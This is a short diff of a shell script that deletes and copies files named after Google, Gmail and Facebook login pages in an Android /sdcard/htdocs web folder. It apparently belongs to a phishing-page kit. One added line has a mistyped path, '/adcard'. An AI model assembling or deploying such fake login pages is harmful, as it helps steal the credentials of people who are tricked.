@@ -11,6 +11,8 @@ rm /sdcard/htdocs/google.ttf
 rm /sdcard/htdocs/login.php
 rm /sdcard/htdocs/google.png
 rm /sdcard/htdocs/gmail.php
+rm /sdcard/htdocs/facebook.ttf
+rm /adcard/htdocs/mobile.png
 cd asset
 cd fcode
 cp facebook.ttf /sdcard/htdocs
